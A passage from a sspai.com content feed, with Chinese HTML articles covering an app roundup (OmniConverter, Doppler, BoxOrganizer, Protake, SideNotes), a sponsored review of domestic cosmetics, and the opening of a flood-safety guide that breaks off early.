src=\"https://cdn.sspai.com/editor/u_/c43roq5b34tar6a1opfg.png\"></figure><p>音频格式的转化和前面的视频转换类似，同样是拖动到窗口中在转换窗口中进行编辑，我有不少 wav 格式的无损音乐，通过 OmniConverter 可以很直观地转换成无损的 FLAC，并且同样可以对采样率、比特率以及音频模式进行细调。速度上 wav 转化成 FLAC 在 M1 芯片 Mac 上转换速度极快，几乎是一首歌一秒即转换成功。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c43roqdb34tar6a1opg0.png\"></figure><p>总的来说，OmniConverter 是一款将 ffmpeg 工具可视化的音视频转换工具，提供了非常好用人性化的 UI 界面，如果你有音视频转换的需求不妨尝试一番。</p>\n<p>你可以在 <a href=\"https://sspai.com/item/278\" target=\"_blank\">少数派</a> 购买 OmniConverter，售价 108 元。</p>\n<span class=\"ss-genuineSoftware\" product-id=\"278\" type=\"genuineSoftware\"> </span><h3>Doppler：管理和分享你的本地音乐</h3>\n<ul>\n<li>平台：macOS / iOS</li>\n<li>关键词：播放器</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@huhuhang\" user-id=\"bs2ovedb34tch278htb0\" href=\"https://sspai.com/u/huhuhang\">@huhuhang</a>：如今，越来越多的平台和个人都更偏爱流媒体音乐服务，但是不得不承认购买数字专辑仍然是一部分人更习惯的方式。尤其是对于音乐发烧友而言，本地化管理音乐一定是首选方式之一。Doppler 就是一款适合于本地管理和播放音乐的应用，继之前推出 <a href=\"https://sspai.com/post/64043\" target=\"_blank\">iOS 版本</a> 之后，macOS 应用也正式上线了。</p>\n<p>打开 Doppler 之后，需要选择本地音乐存放路径。Doppler 支持 MP3、FLAC、WAV、AAC 等主流的音频格式，无需进行单独的转换。而根据 Doppler 的说明，导入 Apple Music 和 iTunes 音乐及播放列表的功能也会在后期上线。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c43roqlb34tasob6hqgg.png\"></figure><p>Doppler 尽可能使用了 macOS 原生控件，整体界面设计简洁大方。左侧的 Library 资料库中包含歌手、专辑和歌曲三个默认的分类，而下方则可自建播放列表。整体来讲，Doppler 的上手是无门槛的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/c08859ee21eb75621c3f3e562b8d56fa.png\"></figure><p>说说 Doppler 的优势和特点。作为一款本地音乐管理应用，Doppler 提供了一系列帮助工具方便资料库的整理。例如将多张光盘合并成一张专辑，同时支持丰富的搜索选项。Doppler 的设备间传输也做得很棒，不仅支持通过 WiFi 或 USB 导入音乐，同时可以通过 AirDrop 或者 WiFi 在设备间共享。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c43ror5b34tasob6hqh0.png\"></figure><p>此外，Doppler 支持与 Last.fm 集成记录播放历史，还可以离线使用。对于 macOS 而言，Doppler 还支持和 <a href=\"https://replay.software/sleeve\" target=\"_blank\">Sleeve</a> 集成提供精致的迷你播放界面。Doppler 表示今年晚些时候还将实现完整的资料库同步。</p>\n<p>对于拥有大量本地音乐库的用户而言，Doppler 非常值得一试。目前 Mac 版本的 Doppler 采用一次性买断的方式，售价为 25 美元，并提供 7 天免费试用。现在就可以前往 <a href=\"https://brushedtype.co/doppler/\" target=\"_blank\">Doppler 官网免费下载</a>。</p>\n<span class=\"ss-application\" app-id=\"13633\"> </span><h3>BoxOrganizer：东西都去哪儿了</h3>\n<ul>\n<li>平台：iOS / Android</li>\n<li>关键词：收纳、物品整理</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Peggy_\" user-id=\"bs2p015b34tch278nkdg\" href=\"https://sspai.com/u/5isr02uh\">@Peggy_</a>：经历过搬家的朋友应该对以下场景不陌生：面对整理好的大大小小的箱子，你会突然在某一刻回忆不起某个物品放在了哪个箱子里，逐个拆开来找显然不现实，但是这种事物脱离掌控的感觉很不好受。即便是对于不搬家的我们来说，在自家犄角旮旯的空间里，要找的物品永远在和我们玩躲猫猫，之前明明看到过的物件在你需要的时候却仿佛凭空蒸发。BoxOrganizer 就试图用一个个电子箱帮助你记住物品所在的位置。</p>\n<p>在 BoxOrganizer 当中，如果我们想要记录物品的具体位置，需要先新建一个项目，在一个项目下，我们可以添加多个箱子，箱子便是我们用以存放物品的容器。以衣柜为例，我们把衣柜作为一个项目，不同房间的衣柜便是不同的箱子，我们的衣物便可以添加到对应房间的箱子里。在物理空间中，一件衣物同一时间只能存放在一个箱子里，但是我们也可以通过给物品添加标签来一次性搞清楚我们所有的「裤子」分别在哪些箱子里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c43rordb34tar307kra0.jpeg\"></figure><p>除了常规的添加物品功能外，BoxOrganizer 还支持为每一件物品、每一个箱子生成二维码，如果你家中凑巧有无线打印机还能够将二维码打印下来，粘贴在相应的位置，后续通过扫码便能对自己的物品存放情况一目了然。目前 BoxOrganizer 还不支持云端同步或是与家人分享，不过这些功能后续都会逐一实现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c43rorlb34tar307krag.jpeg\"></figure><p>你可以通过 <a href=\"https://play.google.com/store/apps/details?id=app.boxorganizer.app\" target=\"_blank\">Play Store</a> 或是 <a href=\"https://apps.apple.com/cn/app/boxorganizer-inventory/id1558366385\" target=\"_blank\">App Store</a> 下载使用 BoxOrganizer。</p>\n<span class=\"ss-application\" app-id=\"16130\"> </span><h2>值得关注的 App 更新</h2>\n<h3>Protake 2.0：支持多机位 Wi-Fi 图传</h3>\n<ul>\n<li>平台：iOS / iPadOS</li>\n<li>关键词：摄影、视频拍摄、监视器</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Vanilla\" user-id=\"bs2ov5lb34tch278f9ag\" href=\"https://sspai.com/u/whoops\">@Vanilla</a>：广受手机摄影爱好者欢迎的电影机应用 Protake 在近日发布了 2.0 大版本更新，为我们带来了强大的「无线图传」功能。无需另外购置专业的摄影设备，我只需要准备一些 iPhone 或者 iPad 以及一台无线路由器，就可以在摄制现场搭建强大的监看网络。</p>\n<p>任意一台安装了 Protake 2.0 的设备都可以作为「摄影机」或者「监视器」，而每台「摄影机」最多可以传输视频到 4 台「监视器」上，每台「监视器」上最多也可以看到 4 台「摄影机」的画面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c43rortb34tar307krb0.png\"></figure><p>图片来源：<a href=\"https://weibo.com/1639529981/KqSHP2Tsk\" target=\"_blank\">@flypig 微博</a>（下同）</p>\n<p>打开 Protake，在「自动」和「专业」两个模式下我可以在界面的右下角看到一个新的图传按钮，点击即可以在设置界面选择设备扮演的角色（「摄影机」还是「监视器」）、「摄影机」的机位号、「监视器」的岗位职能、图传信号的稳定性和清晰度等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c43rosdb34tar6a1ophg.gif\"></figure><p>我在使用 iPhone 或者 iPad 作为「监视器」时，可以通过 A、B、C、D 四个按钮来切换正在监看的「摄影机」机位。如果我使用的是 iPhone 作为「监视器」，那么我最多可以监看 2 个机位的画面，如果我使用的是 iPad 作为「监视器」，那么我最多可以监看 4 个机位的画面，并且按下录制按钮后可以控制所有「摄影机」同时开启录制。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c43rostb34tarbb3pis0.gif\"></figure><p>更加厉害的是，我还可以在屏幕支持杜比视界的 iPhone 或者 iPad 上，监看杜比视界标准的 HDR 画面，甚至是在同一块屏幕上监看 SDR 和 HDR 画面，给我最直观的视觉对比。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c43rotdb34tar307krc0.gif\"></figure><p>你可以在 <a href=\"https://apps.apple.com/cn/app/protake-mobile-cinema-camera/id1498431506\" target=\"_blank\">App Store</a> 下载 Protake 2.0，<a href=\"https://play.google.com/store/apps/details?id=com.blink.academy.protake\" target=\"_blank\">Android 版本</a> 尚未获得更新。</p>\n<span class=\"ss-application\" app-id=\"15444\"> </span><h3>SideNotes 1.3：增加主题、卡片颜色，支持 iCloud 同步等</h3>\n<ul>\n<li>平台：macOS</li>\n<li>关键词：笔记、Markdown</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@红酒皇\" user-id=\"bs2p85tb34tcs0pmdeeg\" href=\"https://sspai.com/u/Fabrina\">@红酒皇</a>：SideNotes 是一款以 Markdown 为主语言的 macOS 笔记应用。应用内的笔记由文件夹分类，每条笔记装载在卡片中。不使用时，所有笔记将会折叠在屏幕右侧，使用时拉开抽屉打开笔记目录，窗口自动悬浮至最前。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c43rottb34tar307krcg.png\"></figure><p>SideNotes 可用作快速储存信息的中转容器，借助它得天独厚的位置优势，所有屏幕上的信息都可以以合适的形式暂存至卡片中。剪贴板中的信息可以长按面板上的「+」号自动生成新卡片，任意照片可以使用拖拽存至新卡片中，任务可以直接使用「 [ ] 」形式添加，文本中还能够用 #rrggbb 格式储存颜色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c43rou5b34tasob6hqhg.png\"></figure><p>在 1.3 版本更新中，SideNotes 增添了六种卡片颜色，并添加了多种主题，用户甚至可以写出自己偏好的主题而不必拘泥于现有的形式。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c43roudb34tar6a1opi0.png\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c43roulb34tar6a1opig.png\"></figure><p>除此之外，还进行了不少细节更新，比如：</p>\n<ul>\n<li>增添了 iCloud 同步选项</li>\n<li>增添了可选字体</li>\n<li>增添了添加新卡片的形式</li>\n<li>增添了一些好用的快捷键，比如笔记之间的移动</li>\n<li>增添了专用储存链接的卡片和文件夹</li>\n<li>增添了行内 Markdown 链接</li>\n</ul>\n<p>你可以在 少数派 购买 SideNotes，应用售价 119 元，<a href=\"https://sspai.com/item/235\" target=\"_blank\">Setapp 用户</a> 可以免费使用 SideNotes。</p>\n<span class=\"ss-genuineSoftware\" product-id=\"71\" type=\"genuineSoftware\"> </span><span class=\"ss-genuineSoftware\" product-id=\"235\" type=\"genuineSoftware\"> </span><h2>App 速报</h2>\n<ul>\n<li>LumaFusion（<a href=\"https://apps.apple.com/cn/app/lumafusion/id1062022008\" target=\"_blank\">iPadOS</a>）：大版本更新至 v3.0，带来视频稳定、外部驱动器编辑直接编辑、外部驱动器编辑导出、图形化的均衡器、第三方音频单元，加入用于滑块和旋转控件的数字键盘。并且对 UI 界面进行了改进，导入 / 导出源的步骤被简化。</li>\n<li>Vivaldi（<a href=\"https://vivaldi.com/blog/vivaldi-introduces-accordion-tabs-and-command-chains/\" target=\"_blank\">Windows | macOS</a>）：更新至 v4.1，带来翻译、邮件、手风琴样式的选项卡、选项卡组可以活动时扩展和最小化、加入了命令链可以将单个快捷方式组合并按顺序执行，帮助快速的执行复杂的操作。</li>\n<li>库乐队（<a href=\"https://www.apple.com/newsroom/2021/07/garageband-features-new-sound-packs-from-dua-lipa-lady-gaga-and-top-producers/\" target=\"_blank\">iOS | iPadOS</a>）：在 Sound Library 加入了全新的 Remix Sessions，可以使用当红艺人的部分歌曲片段进行二次创作，另外可以二次下载的 Producer Packs 发布了数百个免版税的循环、节拍、乐器、架子鼓、合成器的片段可以用来创作新歌。</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68057"},{"title":"国物馆 | 推荐给每一个精致女孩的国产美妆和护肤","date":"2021-08-02 08:16:47","description":"\n<h4>编者注：</h4>\n<p>在对消费者需求不断探索与「为国民，造好物」品牌理念的加持下，<a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 将现代年轻消费者的个性心理与传统文化巧妙结合，力求为大家带来更多时尚、潮流、有现代科技感、技术应用快人一步、高品质且价格友好的产品——而有着与之相同愿景的国货品牌亦不胜枚举。</p>\n<p>我们支持国际化潮流并主张消费自由，但不少平价好用的国货同时也正在被生生埋没，成为你购物车中不曾有过的遗珠之憾。于是少数派联合我们的好朋友 <a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 一起开启了这次国货推荐的征文活动，邀请了一些作者来分享他们使用下来认为不错的国货，在予你受用的同时也希望借此机会让更多的国货被看见。如果你也有心仪的国货想要推荐，非常欢迎你向我们投稿。</p>\n<hr>\n<p>在文章最开头先说一下我的肤质，<strong>大油皮</strong>，无论什么季节都很油，<strong>换季的时候有些敏感</strong>，<strong>容易泛红</strong>（对我油皮但是我敏感皮我就很疑惑）。我挑选所有彩妆和护肤的必需标准就是清爽和防油。如果是干皮的朋友也欢迎分享使用体验。</p>\n<p>近些年出现了一些非常不错的国产护肤和彩妆，打破了很多品类被外国品牌垄断的局面，有些建立起了非常不错的口碑，在市场上开始具有一定的地位。同时，它们也通过消费者的口耳相传，提升了国货护肤和彩妆的形象，大家开始不再认为国货护肤和彩妆的质量略为逊色，也比以前更加相信国货护肤和彩妆。国货护肤和彩妆相对来说价格没有那么高，对于一些化妆入门和学生比较友好。</p>\n<p>但是由于品牌的宣传和广告受限，很多国货品牌曝光机会有限，不如一些成熟的品牌在我们生活中出现的频率。我很希望有更多好的国货护肤和彩妆得到大家的认可之后，也可以得到大家的推荐，让更广泛的人群接触到好的国货产品。</p>\n<p>还是想说，使用体验非常非常个人化，如果有不同意见欢迎一起讨论哈。</p>\n<p>也请大家捂好钱包，理智消费，谢谢。</p>\n<h2>护肤</h2>\n<p>我一向对护肤比较挑剔，因为我觉得是直接接触皮肤的东西，需要非常非常慎重。再加上我换季的时候容易过敏，所以我很少盲目随便买一个护肤品。我的皮肤比较容易出油，甚至有时候比男生还容易出油，所以我对吸收不好的护肤品也很抗拒。</p>\n<h3>瑷尔博士洁颜蜜/氨基酸洗面奶</h3>\n<p>参考价格：68元</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/19/5a6796be1e187ab64179e8794cfd4d9a.jpg\"></figure><p>先吐槽一下，希望国产品牌给自己产品起名字的时候要注意保持一致，我记得买的时候还是洁颜蜜，写这篇文章的时候我又去查了旗舰店，结果后面又加了氨基酸洗面奶……虽然我理解品牌希望别人在搜索的时候自己产品可以多出现，但是还是在命名上谨慎一点，保持一致比较好。</p>\n<p>自从买了之后，已经成为我的常用。它的容量是 120 毫升，手头上的这一瓶我已经用了一半多了。我很喜欢这个泵头，洗脸的时候不用再眯着自己 500 度的近视眼去打开洗面奶的盖子，有泵头的话就方便很多。这个洁颜蜜挤出来之后的液体并不粘稠，甚至接近于水状。但是稍稍揉搓后就会起泡，泡沫丰富且绵密，应该用不到起泡网。清洁完毕之后，没有假滑（就是没有脸上非常光滑但是实际上没有本质改善）。洗完脸之后也非常清爽，也没有快速泛油。</p>\n<p>我在春夏换季的时候也使用的是这个洁颜蜜，泛红减轻了很多，也没有出现什么过敏什么的。当然如果换季过敏特别严重的话，不要盲目购买任何护肤，需要进行一定的测试再进行购买。</p>\n<p>我并不是一个严格的成分党，但是会看一下里面的核心成分。因为我油皮加上换季敏感，所以我会尽量避免掉皂基的洗面奶或者清洁用品。这个洁颜蜜或者洗面奶是个<strong>氨基酸</strong>洁颜蜜，对我的皮肤来说非常温和。同时它对于我这个大油皮来说清洁能力也非常可以。官网给出的核心成分里面有椰油酰甘氨酸钾、椰油酰基谷氨酸TEA盐、乳酸杆菌/豆浆发酵产物滤液、复合氨基酸、二甲基甲硅烷醇透明质酸脂、三皮素、甜橙果皮油。我的化学知识可能太过基础，无法判断各个成分的具体功效，只能提供一下自己的主观感受，如果有专业人士欢迎和大家分享。</p>\n<h3>上水和肌祛痘凝胶</h3>\n<p>参考价格：49 元/3 支</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/19/270726f08893265adde6263c137c9c7c.jpg\"></figure><p>再吐槽一下国产品牌起名字的时候不要硬凑字眼！包装上也没有容易识别的品牌标识真的很难受！我每次都要找半天！而且很多时候品牌英文名字和中文名没有半毛钱关系！这样很容易削弱品牌的竞争优势，稀释掉品牌原有的资产，毕竟无法把品牌中文名和英文名联系起来的话，有很多品牌的特点就无法很好地连接起来了。</p>\n<p>好了吐槽完毕。</p>\n<p>这个好东西是我朋友推荐给我的。我有时候出去玩的时候，连续几天都带妆，再加上有些气候我可能不是很适应，就会长痘。这个祛痘凝胶在晚上的时候厚涂，第二天起来会扁掉，也不再红肿，不影响再次化妆。</p>\n<p>它的一支是 12 毫升，非常小巧，所以我短期出行或者放假回家都会带上它。但是由于包装比较小巧所以可能不是很耐用。但是胜在价格便宜，49 元 3 支，我觉得是我可以承受的价格。</p>\n<p>它的开口是很细的，很容易控制用量，也方便点涂出现痘痘的部位。它的质地是透明的胶状，有点类似于小时候常用的芦荟胶，但是没什么气味，也比芦荟胶更清爽。我一般是厚涂在长痘的部位，吸收得也挺快的，吸收完也没有太多的粘腻的感觉。当然我每次护肤完都会用晚安粉<s>（油皮真的好难啊救命啊我为什么是个油皮我真的好难受）</s>。</p>\n<p>虽然我不懂成分，但是我还是把成分放上来，希望有专业人士可以分享一下相关的内容，提前感谢。我刚刚查了一下它的官网，比我买的时候，好像进行了升级，现在的主要成分是壬二酰胺和 A 醛，还有皮傲宁、积雪草提取物、桃柁酚、伞花烃。好像升级之后膏体颜色有点发黄。</p>\n<h2>彩妆</h2>\n<p>我这种大油皮真的希望彩妆可以不脱妆，毕竟我这样的肤质如果脱妆出汗真的很难看，也很不方便。在夏天的话如果彩妆不防汗，我得一会儿一补妆，真的很难。夏天已经很爱出汗了，再时不时要补妆，就出汗更多。所以我推荐的以下产品，至少在我这里，防油防汗是过关了的。</p>\n<h3>Gracebabi 眉笔</h3>\n<p>参考价格：9.9 元</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/20/10df9d1bbfabedab8e3a1bbe56a32431.jpg\"><figcaption>Gracebabi 眉笔 GC04 焦糖咖</figcaption></figure><p>忘记补充，我自己还是一个眉毛比较稀疏的人，我哪怕睡过头，也会在赶路的间隙拿出眉笔画眉。所以眉笔我用量很大，也尝试过很多产品。我的每个包里，几乎都放着一只眉笔以防自己忘带，然后在赶路的空隙没法画眉，再然后睡过头快迟到加上不能画眉会让我这一天的打开都非常悲伤……</p>\n<p>Gracebabi 这个牌子（救命天知道我记住这个牌子有多难，求求了起个容易记的品牌名字吧）我也是因为刷到品牌创始人的美丽自拍，真的很漂亮很有说服力，让我对这个品牌多了一丝信心，感觉我用了我也会变美<s>（做梦）</s>。</p>\n<p>这个眉笔是双头的，一边是眉笔，一边是刷子。眉笔部分的笔芯是旋转出来使用的，很方便。眉笔的笔头很细，勾勒眉毛的线条很方便。眉笔的部分膏体略软，画起来顺滑流畅，颜色浓淡适宜，不至于一下子画成蜡笔小新。颜色也不错，因为我不太喜欢黑色的眉笔，画起来感觉很生硬，再加上我经常染头发，纯黑的眉毛确实很不合适。官网旗舰店给出了六个颜色，可以方便染头发的朋友们自行选择和发色和谐的眉笔颜色。</p>\n<p>因为我是油皮，也常常睡过头素颜画眉，所以我很担心眉笔上色不好，也担心后续不够持久。但是这根眉笔我重复购买过好几次，品控很稳定，上色的时候不用反复涂描。而且它真的挺让我惊喜的，用了这支眉笔之后我基本上很少在外面补画眉毛，哪怕是中午忍不住困意趴着睡觉，起来眉毛颜色也没有怎么变淡，也不会蹭到衣服上。</p>\n<p>另外它的眉刷部分真的很好用，刷头大小非常合适，正好匹配眉毛的部分不会刷出去。而且刷毛软硬适度，不至于太软刷不齐眉毛，也不至于太硬让我的眉毛大叫好痛这是什么钢丝球。而且我遇到过很多眉笔还没用完，眉刷毛快掉完了，这支眉刷就还很坚挺，用完一整支的时候刷头几乎还是完好的。</p>\n<h3>FLORTTE花洛莉亚双头极细眉笔</h3>\n<p>参考价格：18 元</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/20/bc99ffd991086af1d2be9e0ebb245340.jpg\"><figcaption>FLORTTE 花洛莉亚双头极细眉笔 #B6 薄荷生巧</figcaption></figure><p>求求了，这种难记拗口的品牌名称你们是怎么想出来的啊！我即便买过很多次我也记不住别说完全不了解品牌的人了！希望做得好的国货品牌都好好想想自己品牌名称是不是利于传播和推广，不要再瞎起这种看一眼马冬梅三个字记不住一个字的品牌名称了！</p>\n<p>这支眉笔也是一头是眉笔，一头是眉刷。它比前面一支更细了，画出的线条也更锋利，如果想要眉毛是那种根根分明的效果，这支眉笔是一个不错的选择。它的膏体偏硬一些，真的有点像铅笔的感觉。它的颜色偏浅一些，但是也是比较容易上色，不至于反复涂抹。追求自然效果眉毛的朋友会很喜欢这种效果。旗舰店里也给出了多种颜色，适合染了不同颜色的头发的朋友们挑选，即便是类似的颜色，也会有暖调和冷调之分。</p>\n<p>因为这支眉笔颜色比较浅，所以我会在头发颜色比较浅的时候用这支。当然我本身眉毛不是特别浓，所以画出来效果还可以，但是如果是眉毛本身比较浓郁的朋友可能会对这支比较失望。又因为这支眉笔比较细，膏体又比较硬，我有时候也会拿这支眉笔当眼线笔用来应急。大油皮亲测抗油真的还不错，至少我拿来应急那天没有熊猫眼，也没有眼线脱妆到妈都不认识<s>（不过我化完妆确实我妈不太认识）</s>。</p>\n<h3>橘朵三色巧克力拼盘眼影盘</h3>\n<p>参考价格：39.8 元</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/20/fda5017028e9052e0db1f7a0bd433564.jpg\"><figcaption>橘朵三色巧克力拼盘眼影盘 #05 焦糖海盐松露</figcaption></figure><p>先说明，我有看到最近一些关于橘朵这个品牌是否还属于国货的报道和讨论。但是在我的观点里，如果一个品牌的起源地是在国内，就属于国货。如果有不同观点，欢迎大家来一起讨论。</p>\n<p>我真的还挺喜欢橘朵的，不仅仅是因为这个品牌名字比前面的都容易记，更是因为我觉得它的很多单品的质量都很不错。拿这盘眼影举例说，配色合理，颜色浓郁，上脸也很显色，不会结块，不会干涩，也方便晕染。一盘眼影做到这些特点，我觉得在我这里就是比较不错的了。毕竟有一些国货眼影虽然采用了很好看的包装，或者用了一些很不错的产品概念，结果眼影本身做得不上色、偏色、结块、干涩、晕染不开，还有奇奇怪怪明明是两个人的电影却硬把七大姑八大姨加进来姓名结果从爱情剧变成家庭伦理剧的配色，画到眼上不知道是要窦尔顿盗御马还是要黑脸的张飞叫喳喳。有人会说，啊眼影盘里某个颜色不合适或者缺少某个颜色你可以拿另一盘眼影或者拿单色眼影补充啊，但是，我买眼影盘，就是为了它能让我完整地画完一个眼妆不用再翻箱倒柜东奔西走地去找别的眼影补充配对，毕竟我只是想化妆而不是想开眼影盘的婚介所。当然，包装精美很好，产品设计概念也需要深思熟虑，但是你眼影本身做得不好，那和你非要把一朵娇艳欲滴的玫瑰花插到沙漠上有什么区别，能看是能看，但是也就是看看，而且也看不了几天。</p>\n<p>好了，言归正传。这盘眼影虽然只有三个颜色，但是我觉得配色非常合理。中间的是打底色，然后有一个珠光可以体量，有深色可以做眼线色也可以丰富眼影的层次，基本可以完成眼影，不用去眼影婚介所寻找另一半。虽然包装说不上多么的出彩你要和上文提到的玫瑰花做对比估计不太行，但是透明亚克力的包装简约大方我可以，方形的眼影盘也比较方便我收纳。它本身也是比较小巧，所以我外出带也不会给化妆包增加什么负担。</p>\n<p>还有就是这块眼影盘设计的真的很适合我这种有时拿手上妆的懒人。其实也不是懒，就是有时候时间来不及，也没有那么多心力去拿刷子一点点上色和晕染。我会拿三个手指分别蘸取三个颜色，然后来画眼影。也感谢这个眼影盘真的质量不错很好晕染，不然我手指头画眼影的后果翻车倒不至于，就是很容易画成饿了好几天的食人族部落的标记，颜色一道一道的。然后也扛住了我这个油皮，有一点脱妆但是在我的接受范围里。</p>\n<p>我之前是在线下店买的，还有另外几个配色也都不错。有这盘一样风格适合日常风格的，也有配色比较跳脱活泼的，但是官网很多颜色缺货了。除了这种眼影盘，橘朵的单色眼影眼影也很不错，简直就是眼影婚介所点击率最高的钻石王老五。</p>\n<h3>橘朵流光溢彩眼影膏</h3>\n<p>参考价格：29.8 元</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/20/0c676a161823b3a769908d3f8b945fda.jpg\"><figcaption>橘朵流光溢彩眼影膏 G620</figcaption></figure><p>虽然我不做眼影婚介所，但是我也对一些高点击率的钻石王老五比较了解，毕竟少不经事的时候买了很多不配对就不能活不能完整画眼影的眼影盘，只能硬着头皮去眼影婚介所里找，找到了不少高点击率的钻石王老五但是人家本身就很不错婚介与否完全不影响，结果就是我用那些钻石王老五眼影越来越起劲，面对那些必须配对的眼影盘头皮越来越硬。</p>\n<p>这个钻石王老五，不是，眼影膏，质地是偏土豆泥的质地，比较软。上色的时候颜色饱和度也很高。我买这块眼影膏的原因就是想给自己的眼妆加一点趣味性，不止有闪的部分，还有偏光的闪片。我在柜台上试色的时候，非常心动一下子就看中了。它的闪片不是那种特别大的，太大的闪片虽然也比较有趣，但是我需要有趣适度。就像我说话比较幽默也喜欢开玩笑但是不意味着我要去参加德云社的海选成为专业的相声演员。眼影的闪片就像是花朵上的露珠，有几颗就非常有生动鲜活的感觉，但是露珠太大太多，那么此刻画面就不是一副优美的风景画，而是密集恐惧症的恐怖片。</p>\n<p>这个眼影膏可以点缀到眼下，也可以点缀到眼影的高光部分。因为是土豆泥质地，所以用手上装也可以（对我就是懒人）。闪片是星星形状的，和很多风格的眼妆都不太冲突。闪片看上去蓝色，但是偏光是偏粉紫色的，在阳光下眼影会有不同的折射。但是由于是闪片加上土豆泥比较湿的质地，涂在眼皮上不会显眼皮肿。但是土豆泥质地的眼影需要注意每次使用完之后把盖子盖好，不然到后面质地会变干。包装依然是很小巧，所以我要出门就随手塞进包里，没有什么重量和负担。</p>\n<h3>花知晓独角兽水光唇釉</h3>\n<p>参考价格：109 元</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/20/eb3e36edb816241e36e8b9fb5916f880.jpg\"><figcaption>花知晓独角兽水光唇釉 #小红豆 红豆奶咖色</figcaption></figure><p>夸一夸花知晓这个品牌，英文品牌名字是 Flower Knows，真的很方便记忆，而且也没有奇怪的字眼。</p>\n<p>这支唇釉是我送给我一位好朋友的。我的这位朋友平时几乎不化妆，用口红或者唇釉的次数要比我少很多。但是我送给她这支唇釉之后，她非常喜欢，用唇釉的频率明显提高不少。这支唇釉质地偏水光，比较润，但是不是那种镜面唇釉的质地。涂上之后也不会很黏，不会涂上唇釉之后好像涂上胶水一样。这支颜色是红豆奶咖色，颜色十分日常，我朋友完全素颜，也可以涂上，非常不违和，并且非常显气色。</p>\n<p>花知晓的包装和产品设计理念我觉得都是比较用心的，质量也做得不错。我知道很多国货品牌都在拼命想做出自己的特色，有特色很好，我希望所有国货都有自己的特色。但是有特色不等于特色在于菜，如果用特色来掩饰产品本身的菜，这就很不应该。就拿唇釉来说，做得外观让你觉得这不是一个唇釉，而是一个艺术品，但是打开之后再上嘴你就会觉得这不过是一个金玉其外带颜色的胶棒。那外观做得再好有什么用，供起来没事儿烧柱香？我买唇釉是为了画唇妆，不是为了家里多一个祖宗。</p>\n<p>花知晓还有别的系列，外包装和质量都很好，价格相对来说略高，但是我觉得可以接受。感兴趣的朋友们可以去官网看看。</p>\n<hr>\n<p>和大家分享了我用过的好用国产护肤和彩妆，也说出了我的一些观点。希望好用的国货被越来越多的人知道，国产品牌也可以得到越来越多的认可。也欢迎大家分享大家用过的好用国货！</p>\n","link":"https://sspai.com/post/67788"},{"title":"暴雨和洪涝的季节，这些技巧助你从容自保","date":"2021-08-02 06:30:44","description":"\n<p>大家好，我是致力于让没有医学背景的小伙伴能听懂医生在说啥的心内科 Leslie Pan。</p>\n<p>近期河南暴雨造成了多地城市内涝、少数河流决堤，超过七百多万人受灾。台风烟花近日在浙江沿海登陆后，浙江、上海、江苏多地暴雨连连，北京部分区域气象部门也发出了暴雨红色预警。在这样频发的极端天气下，如何在城市内涝中保护自己和家人的安全是每个人都关心的话题。</p>\n<p>今天我来和大家聊一聊暴雨淹没城市的前后，我们可以做些什么。全文约 1 万字，如果有说的不到位或者错漏的情况希望大家评论里及时指出，先谢谢大家。</p>\n<h2>内涝发生前的准备</h2>\n<h3>居安思危，关注预警信息</h3>\n<h4><strong>01 